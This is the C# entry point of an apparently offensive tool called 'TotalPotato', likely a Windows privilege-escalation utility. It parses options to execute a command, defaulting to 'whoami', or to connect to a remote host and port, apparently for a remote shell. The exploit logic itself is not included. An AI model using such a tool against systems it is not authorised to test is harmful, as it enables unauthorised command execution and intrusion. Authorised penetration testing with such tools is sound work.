using CommandLine;

namespace TotalPotato
{
    public class Program
    {
        public class Options
        {
            [Option('c', "cmd", Required = false, HelpText = "Command to execute")]
            public string Command { get; set; }

            [Option('h', "host", Required = false, HelpText = "Remote Host")]
            public string Host { get; set; }

            [Option('p', "port", Required = false, HelpText = "Remote Port")]
            public int? Port { get; set; }

            [Option('v', "verbose", Required = false, HelpText = "Enable verbose output")]

            public bool Verbose { get; set; }

           
        }

        static void Main(string[] args)
        {
            DisplayHeader();
            ParseAndExecuteArgs(args);
        }

        public static void ParseAndExecuteArgs(string[] args)
        {
            Parser.Default.ParseArguments<Options>(args)
                .WithParsed(options => ExecuteOptions(options))
                .WithNotParsed(errors => HandleParseError());
        }

        private static void ExecuteOptions(Options options)
        {
            var manager = new Handler();

            if (!string.IsNullOrEmpty(options.Host) && options.Port.HasValue)
            {
                WriteColored("[*] Connecting to ", $"{options.Host}:{options.Port}", ConsoleColor.Yellow);
                manager.Run(null, options.Host, options.Port.ToString());
            }
            else
            {
                string command = string.IsNullOrEmpty(options.Command) ? "whoami" : options.Command;

                if (string.IsNullOrEmpty(options.Command))
                {
                    WriteColored("[!] No command provided, defaulting to ", "whoami", ConsoleColor.Yellow);
                }
                else
                {
                    WriteColored("[*] Executing: ", command, ConsoleColor.Green);
                }

                manager.Run(command);
            }
        }

        private static void HandleParseError()
        {
            WriteColored("[!] Invalid arguments provided, defaulting to ", "whoami", ConsoleColor.Red);
            var manager = new Handler();
            manager.Run("whoami");
        }

        public static void WriteColored(string prefix, string coloredText, ConsoleColor color)
        {
            Console.Write(prefix);
            Console.ForegroundColor = color;
            Console.Write(coloredText);
            Console.ResetColor();
            Console.WriteLine();
        }

        public static void DisplayHeader()
        {
            string headerTitle = @"
 _____      _        _   ___      _        _
/__   \___ | |_ __ _| | / _ \___ | |_ __ _| |_ ___
  / /\/ _ \| __/ _` | |/ /_)/ _ \| __/ _` | __/ _ \
 / / | (_) | || (_| | / ___/ (_) | || (_| | || (_) |
 \/   \___/ \__\__,_|_\/    \___/ \__\__,_|\__\___/
                              
";
            string headerVersion = "v1.0.0";
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(headerTitle);
            Console.WriteLine(headerVersion);
            Console.ResetColor();
            Console.WriteLine("==================================================");
            WriteColored("[*] Detected OS: ", OSVersionHandler.GetOSVersion().ToString(), ConsoleColor.Green);
        }
    }
}